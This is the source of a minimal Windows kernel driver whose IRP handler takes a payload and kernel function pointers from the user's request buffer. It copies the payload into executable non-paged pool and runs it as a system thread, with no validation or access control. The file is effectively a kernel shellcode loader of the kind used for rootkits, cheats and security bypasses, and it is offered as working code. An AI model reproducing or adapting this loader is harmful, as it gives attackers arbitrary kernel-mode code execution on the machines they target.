#include <wdm.h>

#include "proto.h"

extern "C"
{
    __int64 __declspec(dllexport) __fastcall MyIRPHandler(struct _DEVICE_OBJECT* a1, IRP* irp)
    {
        ULONG ioctl_no = irp->Tail.Overlay.CurrentStackLocation->Parameters.DeviceIoControl.IoControlCode;
        MyIrpStruct* user_data = (MyIrpStruct*)irp->AssociatedIrp.SystemBuffer;

        void* my_rwx = user_data->nt_ExAllocatePoolWithTag(NonPagedPoolExecute, user_data->payload_size, 'lmao');

        user_data->nt_memcpy(my_rwx, user_data->payload, user_data->payload_size);

        HANDLE hThread;
        user_data->nt_PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, (PKSTART_ROUTINE)my_rwx, NULL);

        ((void (*)(PIRP, CCHAR))user_data->nt_IofCompleteRequest)(irp, 0);

        return 0;
    }

    __int64 __declspec(dllexport) MyIRPHandler_end;

    DRIVER_INITIALIZE DriverEntry;
    _Use_decl_annotations_
        NTSTATUS
        DriverEntry(
            struct _DRIVER_OBJECT* DriverObject,
            PUNICODE_STRING  RegistryPath
        )
    {
        return STATUS_SUCCESS;
    }
}